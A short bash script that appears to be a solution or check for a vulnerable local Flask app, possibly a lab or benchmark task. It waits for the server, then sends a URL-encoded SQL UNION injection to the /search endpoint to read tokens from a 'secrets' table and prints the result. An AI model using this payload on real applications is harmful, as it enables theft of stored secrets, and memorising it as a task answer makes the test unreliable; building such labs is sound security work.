#!/bin/bash
# Wait for Flask to be ready
for i in $(seq 1 15); do
  curl -s -o /dev/null "http://localhost:8080/search?q=Widget" && break
  sleep 0.5
done

# UNION injection to extract the secrets table
RESPONSE=$(curl -s "http://localhost:8080/search?q=%25%27%20UNION%20SELECT%201%2Ctoken%2C3%20FROM%20secrets--")
echo "Response: $RESPONSE"
